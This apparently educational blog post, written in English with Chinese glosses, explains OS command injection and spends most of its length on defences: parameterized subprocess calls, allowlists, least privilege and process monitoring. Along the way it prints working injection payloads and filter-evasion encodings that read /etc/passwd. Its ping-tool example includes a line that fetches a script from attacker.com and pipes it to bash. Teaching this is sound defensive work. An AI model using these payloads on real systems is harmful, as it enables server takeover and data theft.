---
title: "Day 23 — OS Command Injection: When User Input Reaches the Shell"
date: 2026-09-05
tags:
  - daily
  - security
  - english
description: "In 2014, a group of attackers exploited a Shellshock （破壳漏洞） vulnerability in a web application that passed user-controlled （用户可控的） input into Bash （Ba"
---

**Date:** 2026-09-05 | **Difficulty:** ★★★☆☆ Technical | **Source:** OWASP Top 10:2021 A03 / PortSwigger Web Security Academy | **Link:** [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/), [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)

---

## Why This Matters

In 2014, a group of attackers exploited a **Shellshock** （破壳漏洞） vulnerability in a web application that passed **user-controlled** （用户可控的） input into **Bash** （Bash 命令解释器） environment variables. Because the application built shell commands from HTTP headers, attackers could execute arbitrary code on the server without authentication. The same pattern appears in countless **Content Management Systems** （内容管理系统，CMS）, network management tools, and DevOps dashboards.

**OS Command Injection** （操作系统命令注入） is a member of the broader **Injection** family, ranked by OWASP as **A03 in the OWASP Top 10:2021**. It happens when an application passes untrusted input to a system shell. Unlike SQL injection, which targets a database, command injection targets the underlying operating system — giving the attacker the same power as the application process.

> 命令注入的破坏力在于：它不再只是读写数据库，而是直接拿到服务器的 shell 权限。

---

## What Is OS Command Injection?

**OS Command Injection** occurs when an application constructs an operating system command using input from a user or another untrusted source, and then executes it through a shell interpreter. If the input is not strictly validated, an attacker can inject shell **metacharacters** （元字符） such as `;`, `|`, `&&`, `` ` ``, `$()`, or `#` to append or alter commands.

A vulnerable Python example:

```python
import os
import subprocess

def ping_host(hostname):
    # User input is concatenated directly into a shell command
    cmd = f"ping -c 4 {hostname}"
    return os.popen(cmd).read()
```

If the attacker submits:

```
127.0.0.1; cat /etc/passwd
```

The shell will run `ping` and then run `cat /etc/passwd`. The semicolon terminates the first command and starts a second one. This is the simplest form of command injection.

> 拼接字符串进 shell 是最危险的编程习惯之一：用户输入的任何字符都可能变成命令的一部分。

---

## Common Sources of Vulnerable Input

Command injection often hides in features that feel "administrative" or "network-related":

| Feature | Example Input | What the App Often Does |
|---------|--------------|-------------------------|
| Ping / traceroute tools | `8.8.8.8` | `ping -c 4 <input>` |
| DNS lookup pages | `example.com` | `nslookup <input>` |
| File conversion services | `report.pdf` | `convert <input> output.png` |
| Backup / restore wizards | `/data/backups/2026` | `tar -czf backup.tar.gz <input>` |
| Git webhook dashboards | `main` | `git checkout <input>` |
| PDF generators | user-supplied HTML | `wkhtmltopdf <input> output.pdf` |

These features are dangerous because they naturally invite free-form text that is later inserted into a command line. The application intends to let a user check connectivity; the attacker uses the same feature to run `id`, `wget`, or a **reverse shell** （反向 shell）.

> 凡是把用户输入交给系统命令执行的地方，都要默认按命令注入处理。

---

## Exploitation Patterns Beyond the Semicolon

Beginners often test only `;` and `&&`. Skilled attackers use many more shell features to bypass naive filters:

| Technique | Payload | Effect |
|-----------|---------|--------|
| Command chaining | `; cat /etc/passwd` | Run a second command after the first |
| Conditional AND | `&& whoami` | Run only if the first command succeeds |
| Pipe | `\| cat /etc/passwd` | Feed first command output into another |
| Command substitution | `` `id` `` or `$(id)` | Execute a command inline and substitute its output |
| Newline | URL-encoded `%0a` | Starts a new command in many shell contexts |
| Background execution | `& sleep 10` | Runs the injected command in the background |
| Redirection | `> /tmp/evil` | Writes output to a file the attacker can later read |
| Inline logic | `$(cat /etc/passwd)` | Evaluated inside double-quoted strings |

Attackers also encode their payloads to evade **input validation** （输入验证） filters:

- **URL encoding**: `%3B` for `;`, `%26` for `&`, `%7C` for `|`
- **Double encoding**: `%253B` if the application decodes twice
- **Hex/octal encoding**: `$\x2f` for `/`, `$(printf '%b' '\x2f')`
- **Whitespace alternatives**: `${IFS}`, `$IFS$9`, tab characters

Because there are so many ways to express the same shell logic, **blacklisting characters is not a defense**.

> 黑名单过滤注定是失败的：shell 有一百种方法表达同样的意图。

---

## Real-World Example: Ping Tool Exploitation

Imagine a network diagnostic portal that lets engineers run a ping test from the web UI. The code might look like this in PHP:

```php
$target = $_GET['host'];
echo shell_exec("ping -c 4 " . $target);
```

An attacker submits:

```
?host=8.8.8.8; curl http://attacker.com/x.sh | bash
```

The server runs:

```bash
ping -c 4 8.8.8.8; curl http://attacker.com/x.sh | bash
```

If the web server has outbound access and runs with sufficient permissions, the attacker now has a shell session on the server. From there, they can enumerate the network, read configuration files, or install persistence.

---

## Defense: What Actually Works

### 1. Avoid the Shell Entirely

The strongest defense is to never invoke a shell. Most programming languages offer **parameterized APIs** （参数化 API） that pass arguments directly to the operating system without shell interpretation.

Instead of:

```python
os.popen(f"ping -c 4 {hostname}")
```

Use:

```python
import subprocess

result = subprocess.run(
    ["ping", "-c", "4", hostname],
    capture_output=True,
    text=True,
    shell=False  # Default, but explicit is better
)
```

In this example, even if `hostname` contains `; cat /etc/passwd`, it is treated as a single argument to `ping`, not as shell syntax.

> 不带 `shell=True` 的 `subprocess.run` 会把整个字符串当成一个参数，shell 元字符失去特殊含义。

### 2. Use a Strict Allowlist

If you must accept free-form input, define exactly what characters are legal and reject everything else. For a hostname, a sensible allowlist might be:

- Lowercase letters, digits, hyphens, and dots
- Maximum length 253 characters
- Reject anything containing shell metacharacters, spaces, or control characters

```python
import re

def is_valid_hostname(hostname: str) -> bool:
    if len(hostname) > 253:
        return False
    return bool(re.fullmatch(r"[a-z0-9\-\.]+", hostname, re.IGNORECASE))
```

> 白名单不是"只允许某些危险字符"，而是"只接受业务上合法的字符"。

### 3. Run with Least Privilege

If command execution is unavoidable, ensure the process runs with the minimum permissions needed:

- Do not run web applications as `root` or `Administrator`.
- Use dedicated service accounts with restricted file system access.
- Apply **SELinux** （Security-Enhanced Linux） or **AppArmor** （Linux 强制访问控制框架） profiles to limit what the process can execute.
- Consider running inside a **container** （容器） with read-only root filesystem and no `CAP_SYS_ADMIN` capability.

> 命令注入不可能完全消除时，最小权限能把一次漏洞的危害从"系统沦陷"降到"单个目录受影响"。

### 4. Disable Dangerous Functions in the Runtime

Some runtimes let you restrict dangerous operations:

- PHP: disable `exec`, `system`, `passthru`, `shell_exec`, `popen`, `proc_open` in `disable_functions` if not needed.
- Java: use `ProcessBuilder` with a list of arguments instead of `Runtime.getRuntime().exec("sh -c ...")`.
- Node.js: prefer `child_process.spawn` with `{ shell: false }` over `child_process.exec`.

### 5. Layered Defenses

Even with parameterized APIs, add defense in depth:

- **Input validation** on entry.
- **Web Application Firewall (WAF)** rules that detect common command injection patterns.
- **Endpoint Detection and Response (EDR)** alerts for unusual child processes spawned by the web server.
- **Outbound egress filtering** so a compromised server cannot easily download tools or exfiltrate data.

> 命令注入的检测要靠行为：一个 web 进程突然启动 `bash` 并发起外连，这就是最明确的告警。

---

## Key Terms

| English | 中文 | Notes |
|---------|------|-------|
| OS Command Injection | 操作系统命令注入 | 把用户输入拼接到系统 shell 命令中执行的漏洞 |
| Injection (OWASP A03) | 注入 | OWASP Top 10:2021 第三大风险类别 |
| Shellshock | 破壳漏洞 | Bash 环境变量远程命令执行漏洞，CVE-2014-6271 |
| User-Controlled Input | 用户可控输入 | 攻击者能够影响的任何数据 |
| Metacharacter | 元字符 | 在 shell 中有特殊含义的字符，如 `;` `\|` `&` |
| Command Substitution | 命令替换 | `$(command)` 或 `` `command` ``，先执行内部命令再替换 |
| Reverse Shell | 反向 shell | 受害主机主动连接攻击者，提供交互式 shell |
| Input Validation | 输入验证 | 检查输入是否符合预期格式和范围 |
| Blacklist / Blocklist | 黑名单 | 禁止特定字符或模式的方法，易被绕过 |
| Allowlist / Whitelist | 白名单 | 仅允许明确合法的字符或模式 |
| Parameterized API | 参数化 API | 将命令与参数分开传递，避免 shell 解释 |
| Least Privilege | 最小权限原则 | 只授予完成任务所需的最小权限 |
| SELinux | 安全增强型 Linux | Linux 强制访问控制安全模块 |
| AppArmor | Linux 访问控制框架 | 基于路径的强制访问控制 |
| Container | 容器 | 操作系统级虚拟化隔离环境 |
| Egress Filtering | 出站过滤 | 控制服务器对外发起的网络流量 |
| EDR (Endpoint Detection and Response) | 终端检测与响应 | 监控端点进程行为的防护工具 |

---

## 甲方视角思考

1. **代码审计重点查 `exec` / `system` / `popen` 类调用** — 把用户输入直接交给 shell 的代码路径必须全部列入高危审计点，优先使用参数化 API 重写。
2. **网络管理类系统最容易中招** — ping、nslookup、traceroute、备份恢复等功能天然依赖 shell 命令，是命令注入的高发区，上线前必做渗透测试。
3. **最小权限 + 行为监控双保险** — web 服务不得以 root 运行，EDR/SIEM 中监控 web 进程派生 shell、powershell、curl、wget 等异常子进程。
4. **不要依赖黑名单过滤** — 业务上能白名单就白名单，不能白名单也要逐字检查编码和转义，遇到编码绕过及时升级检测规则。

---

## Tomorrow — Day 24 Preview

**File Upload Vulnerabilities** — we will continue the technical phase by examining why "just check the file extension" is dangerously wrong, how attackers bypass MIME-type checks, and what a secure upload flow looks like from storage layout to content validation. Difficulty remains ★★★☆☆.
